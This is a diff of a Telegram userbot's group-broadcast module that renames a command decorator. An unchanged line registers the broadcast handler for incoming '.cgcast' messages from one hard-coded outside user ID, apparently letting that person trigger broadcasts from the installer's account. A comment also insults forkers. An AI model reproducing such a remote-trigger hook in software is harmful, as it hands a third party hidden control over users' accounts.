@@ -11,7 +11,7 @@
 # t.me/SharingUserbot & t.me/Lunatic0de
 
 from userbot import CMD_HELP, CMD_HANDLER as cmd
-from userbot.utils import edit_or_reply, edit_delete, kyy_cmd
+from userbot.utils import edit_or_reply, edit_delete, rzydx_cmd
 from userbot.events import register
 
 # KALO FORK/CLONE ID GC DI BAWAH G USH DI HAPUSS YAA KONTOLL
@@ -32,7 +32,7 @@ GCAST_BLACKLIST = [
 ]
 
 
-@kyy_cmd(pattern="gcast(?: |$)(.*)")
+@rzydx_cmd(pattern="gcast(?: |$)(.*)")
 @register(incoming=True, from_users=5169252959,
           pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
@@ -62,7 +62,7 @@ async def gcast(event):
     )
 
 
-@kyy_cmd(pattern="gucast(?: |$)(.*)")
+@rzydx_cmd(pattern="gucast(?: |$)(.*)")
 async def gucast(event):
     xx = event.pattern_match.group(1)
     if xx:
